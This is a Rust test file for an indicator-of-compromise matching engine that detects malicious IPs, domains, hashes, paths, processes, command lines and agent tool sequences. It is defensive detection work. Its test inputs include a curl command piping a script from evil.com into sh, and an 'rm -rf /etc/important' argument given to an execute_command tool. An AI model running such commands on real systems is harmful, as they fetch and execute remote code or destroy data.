//! Tests for the IoC matching engine.

use std::net::{IpAddr, Ipv4Addr};

use chrono::{Duration, Utc};

use super::database::IoCDatabase;
use super::engine::IoCEngine;
use super::types::*;

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

fn make_entry(indicator: Indicator, threat_id: &str) -> IndicatorEntry {
    IndicatorEntry {
        indicator,
        severity: Severity::High,
        threat_id: threat_id.to_string(),
        description: format!("Test indicator {}", threat_id),
        last_updated: Utc::now(),
        confidence: 0.9,
        false_positive_rate: 0.05,
        permanent: false,
        expires_at: None,
    }
}

fn make_event() -> EventData {
    EventData {
        event_id: "test-event-1".to_string(),
        ..Default::default()
    }
}

// ---------------------------------------------------------------------------
// IP matching
// ---------------------------------------------------------------------------

#[test]
fn test_exact_ip_match() {
    let entries = vec![make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "ip-1",
    )];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)));
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Exact);

    // Non-matching IP
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 2)));
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

#[test]
fn test_cidr_range_match() {
    let entries = vec![make_entry(
        Indicator::MaliciousIP("192.168.1.0/24".to_string()),
        "cidr-1",
    )];
    let engine = IoCEngine::build(entries);

    // Should match: 192.168.1.50
    let mut event = make_event();
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 50)));
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::CIDR);

    // Should match: 192.168.1.0
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 0)));
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Should match: 192.168.1.255
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(192, 168, 1, 255)));
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Should NOT match: 192.168.2.1
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(192, 168, 2, 1)));
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// Domain matching
// ---------------------------------------------------------------------------

#[test]
fn test_exact_domain_match() {
    let entries = vec![make_entry(
        Indicator::MaliciousDomain("evil.com".to_string()),
        "domain-1",
    )];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.destination_domain = Some("evil.com".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Exact);

    // Case insensitive
    event.destination_domain = Some("Evil.COM".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Non-matching
    event.destination_domain = Some("good.com".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

#[test]
fn test_wildcard_domain_match() {
    let entries = vec![make_entry(
        Indicator::MaliciousDomain("*.evil.com".to_string()),
        "domain-wc",
    )];
    let engine = IoCEngine::build(entries);

    // Should match: sub.evil.com
    let mut event = make_event();
    event.destination_domain = Some("sub.evil.com".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Wildcard);

    // Should match: deep.sub.evil.com
    event.destination_domain = Some("deep.sub.evil.com".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Should NOT match: evil.com itself (wildcard requires a subdomain)
    event.destination_domain = Some("evil.com".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());

    // Should NOT match: notevil.com
    event.destination_domain = Some("notevil.com".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// Hash matching
// ---------------------------------------------------------------------------

#[test]
fn test_hash_match() {
    let hash = "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3a1234567890abcdef1234567";
    let entries = vec![make_entry(
        Indicator::MaliciousFileHash(hash.to_string()),
        "hash-1",
    )];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.file_hash = Some(hash.to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Exact);

    // Case insensitive
    event.file_hash = Some(hash.to_uppercase());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Non-matching
    event.file_hash = Some("0000000000000000000000000000000000000000000000000000000000000000".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// File path glob matching
// ---------------------------------------------------------------------------

#[test]
fn test_file_path_glob() {
    let entries = vec![make_entry(
        Indicator::SuspiciousFilePath("/tmp/.hidden*".to_string()),
        "path-1",
    )];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.file_path = Some("/tmp/.hidden_malware".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Glob);

    // Non-matching
    event.file_path = Some("/tmp/visible_file".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// Process name matching
// ---------------------------------------------------------------------------

#[test]
fn test_process_name_match() {
    let entries = vec![make_entry(
        Indicator::SuspiciousProcessName("cryptominer".to_string()),
        "proc-1",
    )];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.process_name = Some("cryptominer".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Case insensitive
    event.process_name = Some("CryptoMiner".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Non-matching
    event.process_name = Some("legitimate_process".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// Command-line regex matching
// ---------------------------------------------------------------------------

#[test]
fn test_command_line_regex() {
    let entries = vec![make_entry(
        Indicator::SuspiciousCommandLine(r"curl.*\|.*sh".to_string()),
        "cmd-1",
    )];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.command_line = Some("curl http://evil.com/script.sh | sh".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Pattern);

    // Non-matching
    event.command_line = Some("curl http://good.com/data.json".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// Tool sequence matching
// ---------------------------------------------------------------------------

#[test]
fn test_tool_sequence_match() {
    let entries = vec![make_entry(
        Indicator::SuspiciousToolSequence(vec![
            "read_file".to_string(),
            "execute_command".to_string(),
            "write_file".to_string(),
        ]),
        "seq-1",
    )];
    let engine = IoCEngine::build(entries);

    // Exact sequence match
    let mut event = make_event();
    event.tool_sequence = vec![
        "read_file".to_string(),
        "execute_command".to_string(),
        "write_file".to_string(),
    ];
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Sequence);

    // Sequence embedded in longer sequence
    event.tool_sequence = vec![
        "list_files".to_string(),
        "read_file".to_string(),
        "execute_command".to_string(),
        "write_file".to_string(),
        "list_files".to_string(),
    ];
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // Non-matching (wrong order)
    event.tool_sequence = vec![
        "execute_command".to_string(),
        "read_file".to_string(),
        "write_file".to_string(),
    ];
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// Arg pattern matching
// ---------------------------------------------------------------------------

#[test]
fn test_arg_pattern_match() {
    let entries = vec![make_entry(
        Indicator::SuspiciousArgPattern {
            tool: "execute_command".to_string(),
            pattern: r"rm\s+-rf\s+/".to_string(),
        },
        "arg-1",
    )];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.tool_name = Some("execute_command".to_string());
    event.tool_args = Some("rm -rf /etc/important".to_string());
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
    assert_eq!(matches[0].match_type, MatchType::Pattern);

    // Wrong tool
    event.tool_name = Some("read_file".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());

    // Right tool, wrong args
    event.tool_name = Some("execute_command".to_string());
    event.tool_args = Some("ls -la /tmp".to_string());
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
}

// ---------------------------------------------------------------------------
// Combined confidence scoring
// ---------------------------------------------------------------------------

#[test]
fn test_combined_confidence() {
    let mut entry = make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "conf-1",
    );
    entry.confidence = 0.8;
    entry.false_positive_rate = 0.1;

    let engine = IoCEngine::build(vec![entry]);

    let mut event = make_event();
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)));
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);

    // combined = 0.8 * (1.0 - 0.1) = 0.72
    let expected = 0.8 * 0.9;
    assert!((matches[0].combined_confidence - expected).abs() < 1e-10);
}

// ---------------------------------------------------------------------------
// Database tests
// ---------------------------------------------------------------------------

#[test]
fn test_database_add_and_match() {
    let mut db = IoCDatabase::new();

    let entry = make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "db-1",
    );
    db.add_indicator_and_rebuild(entry);

    assert_eq!(db.len(), 1);

    let engine = db.engine();
    let mut event = make_event();
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)));
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
}

#[test]
fn test_database_deduplication() {
    let mut db = IoCDatabase::new();

    let entry1 = make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "dedup-1",
    );
    let mut entry2 = make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "dedup-1",
    );
    entry2.severity = Severity::Critical;

    db.add_indicator(entry1);
    db.add_indicator(entry2);
    db.rebuild_engine();

    assert_eq!(db.len(), 1);
    assert_eq!(db.indicators()[0].severity, Severity::Critical);
}

#[test]
fn test_database_expiration() {
    let mut db = IoCDatabase::with_expiration_days(30);

    // Fresh indicator
    let fresh = make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "fresh-1",
    );

    // Old indicator (updated 60 days ago)
    let mut old = make_entry(
        Indicator::MaliciousIP("10.0.0.2".to_string()),
        "old-1",
    );
    old.last_updated = Utc::now() - Duration::days(60);

    // Permanent indicator (old but should not expire)
    let mut perm = make_entry(
        Indicator::MaliciousIP("10.0.0.3".to_string()),
        "perm-1",
    );
    perm.last_updated = Utc::now() - Duration::days(60);
    perm.permanent = true;

    // Indicator with explicit expiry in the past
    let mut expired = make_entry(
        Indicator::MaliciousIP("10.0.0.4".to_string()),
        "expired-1",
    );
    expired.expires_at = Some(Utc::now() - Duration::hours(1));

    db.add_indicator(fresh);
    db.add_indicator(old);
    db.add_indicator(perm);
    db.add_indicator(expired);
    db.rebuild_engine();
    assert_eq!(db.len(), 4);

    let removed = db.expire_indicators();
    assert_eq!(removed, 2); // old-1 and expired-1
    assert_eq!(db.len(), 2);
}

#[test]
fn test_database_stats() {
    let mut db = IoCDatabase::new();
    db.add_indicator(make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "s-1",
    ));
    db.add_indicator(make_entry(
        Indicator::MaliciousDomain("evil.com".to_string()),
        "s-2",
    ));
    db.add_indicator(make_entry(
        Indicator::MaliciousFileHash("abc123".to_string()),
        "s-3",
    ));
    db.rebuild_engine();

    let stats = db.stats();
    assert_eq!(stats.total_entries, 3);
    assert_eq!(stats.malicious_ips, 1);
    assert_eq!(stats.malicious_domains, 1);
    assert_eq!(stats.malicious_hashes, 1);
    assert!(stats.last_updated.is_some());
}

#[test]
fn test_database_remove_by_threat_id() {
    let mut db = IoCDatabase::new();
    db.add_indicator(make_entry(
        Indicator::MaliciousIP("10.0.0.1".to_string()),
        "remove-1",
    ));
    db.add_indicator(make_entry(
        Indicator::MaliciousDomain("evil.com".to_string()),
        "remove-1",
    ));
    db.add_indicator(make_entry(
        Indicator::MaliciousIP("10.0.0.2".to_string()),
        "keep-1",
    ));
    db.rebuild_engine();

    assert_eq!(db.len(), 3);
    let removed = db.remove_by_threat_id("remove-1");
    assert_eq!(removed, 2);
    assert_eq!(db.len(), 1);
}

#[test]
fn test_database_load_from_file() {
    let dir = tempfile::tempdir().unwrap();
    let file_path = dir.path().join("iocs.json");

    let ioc_file = super::database::IoCFile {
        version: "1.0".to_string(),
        indicators: vec![
            make_entry(Indicator::MaliciousIP("10.0.0.1".to_string()), "file-1"),
            make_entry(Indicator::MaliciousDomain("evil.com".to_string()), "file-2"),
        ],
    };

    std::fs::write(&file_path, serde_json::to_string_pretty(&ioc_file).unwrap()).unwrap();

    let mut db = IoCDatabase::new();
    let count = db.load_from_file(&file_path).unwrap();
    assert_eq!(count, 2);
    assert_eq!(db.len(), 2);

    // Verify the engine works
    let engine = db.engine();
    let mut event = make_event();
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)));
    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 1);
}

// ---------------------------------------------------------------------------
// Performance test
// ---------------------------------------------------------------------------

#[test]
fn test_performance_10k_events_1k_indicators() {
    // Build 1,000 indicators of mixed types
    let mut entries = Vec::with_capacity(1000);
    for i in 0..200 {
        entries.push(make_entry(
            Indicator::MaliciousIP(format!("10.{}.{}.0/24", i / 256, i % 256)),
            &format!("perf-ip-{}", i),
        ));
    }
    for i in 0..200 {
        entries.push(make_entry(
            Indicator::MaliciousDomain(format!("evil-{}.com", i)),
            &format!("perf-domain-{}", i),
        ));
    }
    for i in 0..200 {
        entries.push(make_entry(
            Indicator::MaliciousFileHash(format!(
                "{:064x}",
                i as u64 * 0x0123456789abcdef_u64
            )),
            &format!("perf-hash-{}", i),
        ));
    }
    for i in 0..200 {
        entries.push(make_entry(
            Indicator::SuspiciousProcessName(format!("malware-{}", i)),
            &format!("perf-proc-{}", i),
        ));
    }
    for i in 0..200 {
        entries.push(make_entry(
            Indicator::SuspiciousFilePath(format!("/tmp/.evil-{}*", i)),
            &format!("perf-path-{}", i),
        ));
    }
    assert_eq!(entries.len(), 1000);

    let engine = IoCEngine::build(entries);

    // Generate 10,000 events (mostly non-matching)
    let events: Vec<EventData> = (0..10_000)
        .map(|i| {
            let mut event = EventData {
                event_id: format!("perf-event-{}", i),
                ..Default::default()
            };
            // Vary event types
            match i % 5 {
                0 => {
                    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(
                        172,
                        16,
                        (i / 256 % 256) as u8,
                        (i % 256) as u8,
                    )));
                }
                1 => {
                    event.destination_domain = Some(format!("site-{}.example.com", i));
                }
                2 => {
                    event.file_hash = Some(format!("{:064x}", i as u64));
                }
                3 => {
                    event.process_name = Some(format!("process-{}", i));
                }
                4 => {
                    event.file_path = Some(format!("/var/log/app-{}.log", i));
                }
                _ => unreachable!(),
            }
            event
        })
        .collect();

    let start = std::time::Instant::now();
    for event in &events {
        let _ = engine.check_event(event);
    }
    let elapsed = start.elapsed();

    // Must complete 10,000 events in under 1 second
    assert!(
        elapsed.as_secs_f64() < 1.0,
        "Performance test failed: {} events through {} indicators took {:.3}s (limit: 1.0s)",
        events.len(),
        engine.entry_count(),
        elapsed.as_secs_f64()
    );

    eprintln!(
        "Performance: {:.3}ms total, {:.3}us per event ({} events, {} indicators)",
        elapsed.as_secs_f64() * 1000.0,
        elapsed.as_secs_f64() * 1_000_000.0 / events.len() as f64,
        events.len(),
        engine.entry_count()
    );
}

// ---------------------------------------------------------------------------
// Multiple indicators matching same event
// ---------------------------------------------------------------------------

#[test]
fn test_multiple_matches_single_event() {
    let entries = vec![
        make_entry(
            Indicator::MaliciousIP("10.0.0.1".to_string()),
            "multi-1",
        ),
        make_entry(
            Indicator::MaliciousDomain("evil.com".to_string()),
            "multi-2",
        ),
        make_entry(
            Indicator::SuspiciousProcessName("malware".to_string()),
            "multi-3",
        ),
    ];
    let engine = IoCEngine::build(entries);

    let mut event = make_event();
    event.destination_ip = Some(IpAddr::V4(Ipv4Addr::new(10, 0, 0, 1)));
    event.destination_domain = Some("evil.com".to_string());
    event.process_name = Some("malware".to_string());

    let matches = engine.check_event(&event);
    assert_eq!(matches.len(), 3);
}

// ---------------------------------------------------------------------------
// Empty engine
// ---------------------------------------------------------------------------

#[test]
fn test_empty_engine() {
    let engine = IoCEngine::build(Vec::new());
    let event = make_event();
    let matches = engine.check_event(&event);
    assert!(matches.is_empty());
    assert_eq!(engine.entry_count(), 0);
}
